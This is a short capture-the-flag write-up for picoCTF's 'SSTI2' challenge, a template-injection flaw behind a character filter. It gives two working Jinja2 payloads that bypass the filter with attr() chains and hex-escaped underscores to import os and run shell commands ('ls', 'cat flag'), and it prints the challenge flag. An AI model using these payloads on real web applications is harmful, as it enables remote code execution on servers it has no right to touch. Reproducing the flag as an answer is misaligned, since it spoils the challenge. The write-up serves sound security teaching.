## SSTI2

<img src="images/chall.png" width=600>

We are given a webpage that is vulnerable to SSTI, but implements a filter.  

<img src="images/webpage.png" width=600>

The filter is really restrictive but I found a payload that gives RCE.  

```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
```

Submitting the payload reveals the directory structure.  

<img src="images/ls.png" width=600>

We can then read the flag file.  

```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
```

Flag: `picoCTF{sst1_f1lt3r_byp4ss_4de30aa0}`